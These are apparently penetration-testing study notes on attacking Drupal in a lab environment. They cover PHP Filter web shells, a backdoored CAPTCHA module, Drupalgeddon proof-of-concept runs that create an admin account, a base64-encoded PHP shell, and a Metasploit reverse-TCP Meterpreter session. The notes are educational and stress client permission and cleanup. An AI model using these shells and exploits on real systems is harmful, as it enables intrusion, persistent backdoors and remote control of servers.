![Image](https://images.openai.com/static-rsc-4/tt17OFsMTRrDA16mwGtEEbThYLm8LCkZPXrMX2X3XTJMsZBU66kXvTaGboiGv5kTpccgTjHII6LATEqDNaubhi6g-MUEj3zKrjOtvUtI_Qdg085MA0z84BSvp-msytqY4wPb9jDJUmoOTNF_evgcTqDU502DmTYpqiApLAxqIw2hb8RzcqUOg7fwWGtPh143?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/V5uBlt40AAd6m8UXQjeXLdpU4e98WbSOszcV-PxAAYgs_bnz55erRESaRtb5bDJtK_erS3waUm2zvH4PpB_bh3J9Wo1Zpiaa2F6m-FE9bgmwkWliE9DnyfaAnbbj53nnyG8tlHEWuFSYSv4jPtPWjNMwVZJROzPacz36Ps76XeWaIhetKrdQVrr9f8OYN-VZ?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/h2CUJ6zb9GuAgn9gU3P4ehvpkVXjpP-6Sqw1TOkG2JbryfiuUR037bFgvzu4kB72iNxripxTrSVuiaXvCoD4pQDFm05ateoBa_d7or55774x5kLhsmxxbMZEbS8eeoD8unuBIU-RGA2Q3-rLiB2LywFomx5-aVFaMJ1bbbi6lknhwPlIlyez0-SsKplPDQ-o?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/y5Gq5YMVTmQNi8ZcbnO-fD1KtArSh0XjZKxWYdwYTlY4KiiS74LQ2FcjVX5dUAE8xIog6TBXAWIfSkAXIoaWoEm1D1gctoWJmqM59dP1p-V71S_OErzL_UopC7skbXgXFwSOEeIB74Sdz-7iTmyWLKPL8mCP5559PbKFzwJ--MyxDE0c4TLj1Un-LtQQK8qz?purpose=fullsize)

---

# 1. Attacking Drupal — Overview

At this stage, we have:

```text
Drupal identified
      ↓
Version fingerprinted
      ↓
Misconfigurations & vulnerabilities
      ↓
Attempt to gain internal network access
```

Unlike some other CMS platforms, obtaining a shell through the Drupal administrator console is **not as simple as editing a PHP file in a theme or uploading a malicious PHP script**.

This makes understanding Drupal's **modules, permissions, functionality, and version-specific vulnerabilities** particularly important.

---

# 2. Main Attack Paths

This section presents three major approaches:

```text
                       Drupal
                          │
          ┌───────────────┼────────────────┐
          │               │                │
          ▼               ▼                ▼
    PHP Filter       Backdoored       Known
      Module          Module          Vulnerabilities
          │               │                │
          ▼               ▼                ▼
     PHP Code         Web Shell       Drupalgeddon
     Execution        Execution       Vulnerabilities
```

The three major vulnerability paths covered are:

### Path 1

**Leveraging the PHP Filter module**

### Path 2

**Uploading a backdoored module**

### Path 3

**Leveraging known vulnerabilities**

Including:

- Drupalgeddon
    
- Drupalgeddon2
    
- Drupalgeddon3
    

---

# 🔥 3. Leveraging the PHP Filter Module

In **older Drupal versions, before Drupal 8**, an administrator could log in and enable the:

```text
PHP Filter
```

module.

The module:

> **"Allows embedded PHP code/snippets to be evaluated."**

This functionality can turn administrative access into code execution.

---

# 🧠 4. PHP Filter Attack Chain

```text
Administrator Credentials
          ↓
Drupal Admin Access
          ↓
Enable PHP Filter
          ↓
Create Basic Page
          ↓
Insert PHP
          ↓
Save Page
          ↓
Request Page
          ↓
PHP Executes
          ↓
www-data
```

This is a classic example of **abusing legitimate application functionality**.

---

# 🖥️ 5. Enable PHP Filter

The source uses:

```text
http://drupal-qa.inlanefreight.local/#overlay=admin/modules
```

From there:

1. Find the **PHP Filter** module.
    
2. Tick its checkbox.
    
3. Scroll down.
    
4. Select:
    

```text
Save configuration
```

---

# 📄 6. Create a Basic Page

After enabling the module:

```text
Content
   ↓
Add content
   ↓
Basic page
```

The source uses:

```text
http://drupal-qa.inlanefreight.local/#overlay=node/add
```

The **Basic page** option can be used to create static content such as an "About us" page.

---

# 🐚 7. Insert PHP Code

The source uses:

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

The important concept is:

```text
$_GET[...]
    ↓
User-controlled HTTP parameter
    ↓
system()
    ↓
OS command execution
```

---

# 🔐 8. Why Use a Random Parameter?

The source specifically avoids using:

```php
system($_GET['cmd']);
```

and instead uses:

```text
dcfdd5e021a869fcc6dfaef8bf31377e
```

The reason is assessment safety.

A predictable parameter such as:

```text
?cmd=
```

could make the web shell easier for another attacker to discover.

The source describes this as a potential **"drive-by" attacker** scenario.

---

# 🧠 9. MD5 Hash as the Parameter

The source explains that the MD5 representation can originate from:

- A hashed command
    
- A hashed string
    
- Something difficult to guess
    
- Something absent from common directory-brute-force wordlists
    

So instead of:

```text
cmd
```

we have:

```text
dcfdd5e021a869fcc6dfaef8bf31377e
```

### Important principle

This is **not authentication** or a real security control.

It is simply an attempt to reduce accidental discovery of the temporary assessment shell.

---

# 📝 10. Set Text Format to PHP Code

When creating the Basic page, the source emphasizes:

```text
Text format
     ↓
PHP code
```

This is critical because the PHP Filter module needs the content to be interpreted as PHP.

After saving, the example page becomes:

```text
http://drupal-qa.inlanefreight.local/node/3
```

---

# 🧪 11. Execute a Command

Commands can be supplied through the URL parameter.

Example:

```text
?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

The source also demonstrates doing this with `cURL`:

```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

Result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

# 👤 12. Understanding the Result

The command executes as:

```text
www-data
```

with:

```text
UID = 33
GID = 33
```

So:

```text
PHP Filter
    ↓
PHP execution
    ↓
OS command execution
    ↓
www-data
```

Again, this is **code execution**, not necessarily root access.

---

# ⚠️ 13. Drupal 8+ Difference

A major version-specific distinction:

> From **Drupal 8 onwards**, the PHP Filter module is **not installed by default**.

Therefore:

```text
Drupal < 8
    ↓
PHP Filter may already be available
```

whereas:

```text
Drupal 8+
    ↓
PHP Filter not installed by default
```

---

# 📦 14. Installing PHP Filter on Drupal 8+

The source explains that the tester would have to install the module manually.

The example downloads:

```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

### ⚠️ Assessment consideration

Because this changes the client's Drupal installation, the source says:

> **We may want to check with the client first.**

This is extremely important during a professional penetration test.

---

# 🛠️ 15. Installing the Module

After downloading:

```text
Administration
      ↓
Reports
      ↓
Available updates
```

The source notes that the location may differ depending on the Drupal version and could instead be under:

```text
Extend
```

Example URL:

```text
http://drupal.inlanefreight.local/admin/reports/updates/install
```

Then:

```text
Browse
  ↓
Select module archive
  ↓
Install
```

---

# 🧹 16. Cleanup After PHP Filter Testing

Once testing is complete:

```text
Remove / disable PHP Filter
          +
Delete pages created for RCE
```

The source explicitly says these changes should be cleaned up after testing.

### Reporting

Document:

```text
Module installed
Page created
Purpose
Commands executed
Cleanup performed
```

---

# 🔥 17. Uploading a Backdoored Module

Another technique is to upload a modified Drupal module.

Drupal allows users with appropriate permissions to upload modules.

Conceptually:

```text
Legitimate Module
       ↓
Download
       ↓
Modify
       ↓
Add Shell
       ↓
Repackage
       ↓
Upload
       ↓
Install
       ↓
Shell accessible
```

The source uses:

```text
CAPTCHA
```

as the example module.

---

# 📥 18. Download the CAPTCHA Module

The source uses:

```bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

The archive is then extracted.

---

# 🐚 19. Add a Web Shell

The source adds:

```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

Notice that the parameter is different from the PHP Filter example:

```text
PHP Filter:
dcfdd5e021a869fcc6dfaef8bf31377e

Backdoored module:
fe8edbabc5c5c9b7b764504cd22b17af
```

Again, both are randomized rather than using a predictable `cmd` parameter.

---

# 📂 20. Why `.htaccess` Is Added

Drupal denies direct access to:

```text
/modules
```

Therefore, the source creates a:

```text
.htaccess
```

file.

The contents are:

```apache
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

The purpose is to allow the relevant folder to be accessed when requesting files under `/modules`.

---

# 📦 21. Repackage the Module

The source copies both files into the CAPTCHA directory:

```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

The archive contains the legitimate CAPTCHA module files plus the added assessment files.

---

# 🖥️ 22. Upload the Backdoored Module

With appropriate administrative access:

```text
Manage
  ↓
Extend
  ↓
+ Install new module
```

Example:

```text
http://drupal.inlanefreight.local/admin/modules/install
```

Then:

```text
Browse
   ↓
Select modified CAPTCHA archive
   ↓
Install
```

---

# 🌐 23. Access the Web Shell

After successful installation, the source accesses:

```text
/modules/captcha/shell.php
```

using:

```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

So again:

```text
Admin access
    ↓
Install module
    ↓
Modified module
    ↓
shell.php
    ↓
Command execution
    ↓
www-data
```

---

# 🧨 24. Known Drupal Vulnerabilities

Drupal core has suffered from several serious RCE vulnerabilities historically called:

```text
Drupalgeddon
Drupalgeddon2
Drupalgeddon3
```

The source lists three:

|Name|CVE|Main Impact|
|---|---|---|
|Drupalgeddon|CVE-2014-3704|Pre-auth SQL injection|
|Drupalgeddon2|CVE-2018-7600|Remote Code Execution|
|Drupalgeddon3|CVE-2018-7602|Authenticated Remote Code Execution|

---

# 💥 25. Drupalgeddon — CVE-2014-3704

The source describes Drupalgeddon as:

```text
Pre-authenticated SQL injection
```

It affects:

```text
Drupal 7.0 → 7.31
```

and was fixed in:

```text
Drupal 7.32
```

Potential impact described by the source includes:

```text
SQL Injection
      ↓
Upload malicious form
      OR
Create new admin user
```

---

# 🔑 26. Drupalgeddon Attack Chain

The source demonstrates creating a new administrator:

```text
Pre-auth SQL Injection
        ↓
Create admin user
        ↓
Log in
        ↓
Enable PHP Filter
        ↓
Remote Code Execution
```

This is a good example of **chaining vulnerabilities/functionality**.

The initial vulnerability does not necessarily need to directly provide a shell.

Instead:

```text
Initial Vulnerability
        ↓
Administrative Access
        ↓
Abuse Legitimate Functionality
        ↓
RCE
```

---

# 🛠️ 27. Drupalgeddon PoC

The source uses a PoC script and runs:

```bash
python2.7 drupalgeddon.py
```

The help output indicates:

```text
-t TARGET
-u USERNAME
-p PWD
```

Usage:

```text
drupalgeddon.py -t http[s]://TARGET_URL -u USER -p PASS
```

---

# 👤 28. Creating an Administrator

The source demonstrates:

```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

The result:

```text
[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

So the newly created account is:

```text
Username: hacker
Password: pwnd
```

---

# 🔓 29. Post-Exploitation From Drupalgeddon

After creating the administrator account:

```text
hacker:pwnd
      ↓
Drupal Login
      ↓
Administrator
      ↓
PHP Filter / other methods
      ↓
Shell
```

The source confirms that the newly created account can successfully log in.

It also notes that Metasploit has a corresponding module:

```text
exploit/multi/http/drupal_drupageddon
```

---

# 💣 30. Drupalgeddon2 — CVE-2018-7600

Drupalgeddon2 is another major Drupal vulnerability.

The source describes it as:

```text
Remote Code Execution
```

It affects:

```text
Drupal versions prior to 7.58
Drupal versions prior to 8.5.1
```

The underlying issue is described as insufficient input sanitization during user registration, allowing system-level commands to be injected.

---

# 🧪 31. Drupalgeddon2 PoC

The source uses a Python 3 PoC.

Command:

```bash
python3 drupalgeddon2.py
```

The PoC identifies itself as:

```text
Proof-Of-Concept for CVE-2018-7600
```

The target used in the example:

```text
http://drupal-dev.inlanefreight.local/
```

The script then checks:

```text
http://drupal-dev.inlanefreight.local/hello.txt
```

---

# 📄 32. Confirming File Upload

The source verifies that `hello.txt` was uploaded:

```bash
curl -s http://drupal-dev.inlanefreight.local/hello.txt
```

Output:

```text
;-)
```

This establishes that the exploit achieved file creation on the target.

---

# 🐚 33. Turning File Upload Into RCE

The source then modifies the exploit to upload a PHP file containing:

```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

The PHP content is Base64 encoded:

```bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```

Output:

```text
PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

---

# 🔧 34. Create the PHP File

The source uses:

```bash
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

This produces:

```text
mrb3n.php
```

The modified exploit then checks:

```text
http://drupal-dev.inlanefreight.local/mrb3n.php
```

---

# 🎯 35. Confirming Drupalgeddon2 RCE

Finally:

```bash
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

Result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Attack chain:

```text
CVE-2018-7600
       ↓
Exploit
       ↓
File creation
       ↓
PHP file
       ↓
HTTP request
       ↓
Command execution
       ↓
www-data
```

---

# 💀 36. Drupalgeddon3 — CVE-2018-7602

Drupalgeddon3 is:

```text
Authenticated Remote Code Execution
```

It affects multiple versions of Drupal core.

An important requirement is:

```text
User must have ability to delete a node
```

The source demonstrates exploitation using Metasploit.

---

# 🍪 37. Session Cookie Requirement

Before exploiting Drupalgeddon3, the tester needs:

```text
Valid session cookie
```

The source shows obtaining the session through the authenticated Drupal interface.

Conceptually:

```text
Drupal Login
      ↓
Authenticated Session
      ↓
Session Cookie
      ↓
Exploit Module
```

---

# 💻 38. Metasploit Configuration

The source configures:

```text
rhosts
VHOST
drupal_session
DRUPAL_NODE
LHOST
```

Example:

```text
set rhosts 10.129.42.195
set VHOST drupal-acc.inlanefreight.local
set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
set DRUPAL_NODE 1
set LHOST 10.10.14.15
```

---

# ⚙️ 39. Drupalgeddon3 Options

The source shows:

|Option|Meaning|
|---|---|
|`DRUPAL_NODE`|Existing node number|
|`DRUPAL_SESSION`|Authenticated session cookie|
|`RHOSTS`|Target host|
|`RPORT`|Target port|
|`SSL`|HTTPS setting|
|`TARGETURI`|Drupal installation path|
|`VHOST`|HTTP virtual host|

The node must exist, and examples include:

```text
Page
Article
Forum topic
Post
```

---

# 🎯 40. Payload

The example uses:

```text
php/meterpreter/reverse_tcp
```

with:

```text
LHOST = 10.10.14.15
LPORT = 4444
```

Attack flow:

```text
Authenticated Drupal User
          ↓
Can Delete Node
          ↓
Drupalgeddon3
          ↓
PHP Meterpreter
          ↓
Reverse TCP
```

---

# 🐚 41. Successful Drupalgeddon3 Exploitation

The source executes:

```text
exploit
```

Metasploit reports:

```text
Started reverse TCP handler
```

Then:

```text
Meterpreter session 1 opened
```

The session is obtained on the target.

The source then executes:

```text
meterpreter > getuid
```

Result:

```text
Server username: www-data (33)
```

---

# 🖥️ 42. Target System Information

The source runs:

```text
meterpreter > sysinfo
```

Output identifies:

```text
Computer : app01
OS       : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux
```

So the successful exploit gives:

```text
Drupal
  ↓
RCE
  ↓
Meterpreter
  ↓
www-data
  ↓
Linux app01
```

---

# 🧠 43. Drupal Vulnerability Comparison

|Vulnerability|CVE|Authentication|Impact|
|---|---|---|---|
|Drupalgeddon|CVE-2014-3704|Pre-auth|SQL injection → possible admin creation|
|Drupalgeddon2|CVE-2018-7600|Pre-auth|RCE|
|Drupalgeddon3|CVE-2018-7602|Authenticated|RCE|
|PHP Filter|—|Admin|PHP/code execution|
|Backdoored module|—|Appropriate permissions/admin|Web shell/RCE|

---

# 🔥 44. Version Ranges to Memorize

### Drupalgeddon

```text
Drupal 7.0 → 7.31
```

Fixed in:

```text
7.32
```

### Drupalgeddon2

Affected:

```text
Before 7.58
Before 8.5.1
```

### Drupalgeddon3

```text
Multiple Drupal 7.x and 8.x versions
```

Requires:

```text
Authenticated user
+
Permission to delete a node
```

---

# 🗺️ 45. Complete Drupal Attack Methodology

```text
                       DRUPAL
                          │
                          ▼
                  Version Discovery
                          │
                          ▼
                 Component Enumeration
                          │
             ┌────────────┼─────────────┐
             ▼            ▼             ▼
         PHP Filter   Module Upload   CVE Research
             │            │             │
             ▼            ▼             ▼
         PHP Code     Backdoored      Drupalgeddon
         Execution      Module             │
             │            │        ┌────────┼────────┐
             │            │        ▼        ▼        ▼
             │            │      2014     2018     2018
             │            │       ↓         ↓        ↓
             │            │     SQLi       RCE      RCE
             │            │       ↓
             │            │     Admin
             │            │       ↓
             └────────────┴───────┴─────────────┐
                                                ▼
                                             www-data
                                                │
                              ┌─────────────────┴────────────────┐
                              ▼                                  ▼
                       Privilege Escalation               Internal Network
                                                               Access
```

---

# 🛡️ 46. Professional Assessment Hygiene

This section contains several important operational lessons.

## Before changing the target

If you are going to:

- Install a module
    
- Enable PHP Filter
    
- Upload a modified module
    
- Create an RCE page
    

you should:

```text
Confirm authorization
        ↓
Check with client if required
        ↓
Document planned change
```

The source explicitly advises keeping the client apprised and obtaining permission before making these changes.

---

## During exploitation

Use:

```text
Non-obvious parameters
Controlled payloads
Minimal changes
```

Avoid unnecessary destructive actions.

---

## After exploitation

Clean up:

```text
PHP Filter
   ↓
Disable/remove

RCE page
   ↓
Delete

Backdoored module
   ↓
Remove

Temporary files
   ↓
Remove
```

---

# ⭐ 47. Important Commands — Revision Sheet

### PHP Filter RCE

```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

### Download PHP Filter

```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

### Download CAPTCHA

```bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
```

### Extract CAPTCHA

```bash
tar xvf captcha-8.x-1.2.tar.gz
```

### Create module archive

```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

### Backdoored module RCE

```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

### Drupalgeddon

```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

### Drupalgeddon2

```bash
python3 drupalgeddon2.py
```

### Base64 PHP payload

```bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```

### Create PHP file

```bash
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

### Confirm Drupalgeddon2 RCE

```bash
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

---

# 🧠 48. CPTS Must-Know Concepts

### PHP Filter

```text
Older Drupal
     ↓
PHP Filter
     ↓
Admin enables module
     ↓
Basic page
     ↓
PHP code
     ↓
RCE
```

### Backdoored Module

```text
Legitimate module
     ↓
Modify
     ↓
Add shell
     ↓
Repackage
     ↓
Upload/install
     ↓
Shell
```

### Drupalgeddon

```text
CVE-2014-3704
     ↓
Pre-auth SQL Injection
     ↓
Create admin
     ↓
Login
     ↓
PHP Filter / other functionality
     ↓
RCE
```

### Drupalgeddon2

```text
CVE-2018-7600
     ↓
Pre-auth RCE
     ↓
Upload PHP
     ↓
Execute commands
```

### Drupalgeddon3

```text
CVE-2018-7602
     ↓
Authenticated RCE
     ↓
Requires node deletion ability
     ↓
Valid session cookie
     ↓
Meterpreter
     ↓
www-data
```

---

# 🎯 49. The Biggest Lessons From This Section

### 1. **Admin access can be enough**

You don't always need a separate vulnerability.

```text
Admin
 ↓
Powerful functionality
 ↓
Code execution
```

---

### 2. **Drupal version matters enormously**

The available attack paths change substantially between versions.

```text
Drupal < 8
     ↓
PHP Filter may be available by default

Drupal 8+
     ↓
PHP Filter not installed by default
```

---

### 3. **Modules dramatically expand the attack surface**

Always enumerate:

```text
Core
Modules
Themes
Permissions
```

---

### 4. **Vulnerabilities can be chained**

The best example is:

```text
Drupalgeddon
     ↓
Create admin
     ↓
Admin login
     ↓
PHP Filter
     ↓
RCE
```

A vulnerability doesn't necessarily have to provide the final objective directly.

---

### 5. **Authentication requirements matter**

Compare:

```text
Drupalgeddon
→ Pre-auth

Drupalgeddon2
→ Pre-auth

Drupalgeddon3
→ Authenticated
```

Always determine the prerequisites before attempting exploitation.

---

### 6. **Permissions matter**

Drupalgeddon3 requires the user to have the ability to:

```text
Delete a node
```

Therefore, knowing:

```text
Username
```

is not always enough.

You also need to understand:

```text
User permissions
```

---

# 🏆 50. Final CPTS Cheat Sheet

```text
╔══════════════════════════════════════════════╗
║             ATTACKING DRUPAL                 ║
╠══════════════════════════════════════════════╣
║ PHP FILTER                                   ║
║ Older versions (<8)                         ║
║ Admin → Enable PHP Filter → Basic Page      ║
║ → PHP → RCE                                 ║
╠══════════════════════════════════════════════╣
║ BACKDOORED MODULE                            ║
║ Download module → Modify → Add shell        ║
║ → .htaccess → Repackage → Install           ║
║ → /modules/.../shell.php → RCE              ║
╠══════════════════════════════════════════════╣
║ DRUPALGEDDON                                 ║
║ CVE-2014-3704                                ║
║ Drupal 7.0–7.31                              ║
║ Pre-auth SQLi → Admin creation              ║
╠══════════════════════════════════════════════╣
║ DRUPALGEDDON2                                ║
║ CVE-2018-7600                                ║
║ Before 7.58 / 8.5.1                         ║
║ Pre-auth RCE                                 ║
╠══════════════════════════════════════════════╣
║ DRUPALGEDDON3                                ║
║ CVE-2018-7602                                ║
║ Authenticated RCE                            ║
║ Requires node deletion permission            ║
╠══════════════════════════════════════════════╣
║ POST-EXPLOITATION                            ║
║ RCE → www-data → Local Enum → Privesc       ║
║                         ↓                    ║
║                 Internal Network             ║
╚══════════════════════════════════════════════╝
```

## 🔑 One-line methodology

> **Identify Drupal → determine version → enumerate modules/permissions → look for exploitable functionality → research version-specific CVEs → validate safely → obtain RCE → enumerate the host/internal environment → clean up and report.**

The section then moves on from **WordPress, Drupal, and Joomla** to **Tomcat**.